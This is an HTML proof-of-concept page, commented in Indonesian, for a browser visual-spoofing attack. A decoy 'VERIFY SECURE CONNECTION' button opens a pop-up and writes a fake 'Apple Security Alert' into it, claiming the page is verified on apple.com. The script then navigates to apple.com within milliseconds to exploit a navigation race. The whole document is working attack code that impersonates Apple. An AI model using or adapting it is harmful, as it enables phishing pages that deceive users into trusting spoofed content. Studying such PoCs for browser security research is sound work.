<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
    <title>Security Research PoC</title>
    <style>
      body, html {
        margin: 0; padding: 0; height: 100%; background: #000;
        display: flex; align-items: center; justify-content: center;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .card {
        text-align: center; background: #1c1c1e; padding: 40px; border-radius: 20px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
      }
      button {
        padding: 18px 36px; font-size: 20px; font-weight: bold;
        background: #0a84ff; color: #fff; border: none; border-radius: 12px;
        cursor: pointer; transition: transform 0.1s ease;
      }
      button:active { transform: scale(0.95); }
    </style>
  </head>
  <body>
    <div class="card">
      <button id="triggerBtn">VERIFY SECURE CONNECTION</button>
    </div>

    <script>
      document.getElementById("triggerBtn").onclick = function () {
        this.style.display = "none";

        // Membuka tab baru / pop-up target
        const targetWindow = window.open("about:blank", "_blank");

        if (targetWindow) {
          // Menyuntikkan payload tampilan kustom (Visual Spoof)
          targetWindow.document.write(`
            <!DOCTYPE html>
            <html>
            <head><title>Apple - Official Site</title></head>
            <body style="margin:0;padding:0;background:#f5f5f7;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:-apple-system,sans-serif;">
              <div style="text-align:center;padding:20px;">
                <h1 style="font-size:48px;color:#1d1d1f;margin-bottom:10px;">Apple Security Alert</h1>
                <p style="font-size:24px;color:#86868b;">Session validation required for verification.</p>
                <div style="margin-top:40px;font-size:18px;color:#ff3b30;font-weight:bold;">Status: Protected & Verified (apple.com)</div>
              </div>
            </body>
            </html>
          `);
          targetWindow.document.close();

          // Mengeksploitasi jeda race condition navigasi ganda
          setTimeout(() => {
            try {
              targetWindow.location.href = "https://apple.com";
            } catch (e) {}
          }, 50);

          // Memaksa state race condition pada render pipeline tanpa dialog modal terlarang
          let interval = setInterval(() => {
            try {
              if (targetWindow.closed) {
                clearInterval(interval);
              }
            } catch (err) {
              clearInterval(interval);
            }
          }, 10);
        }
      };
    </script>
  </body>
</html>
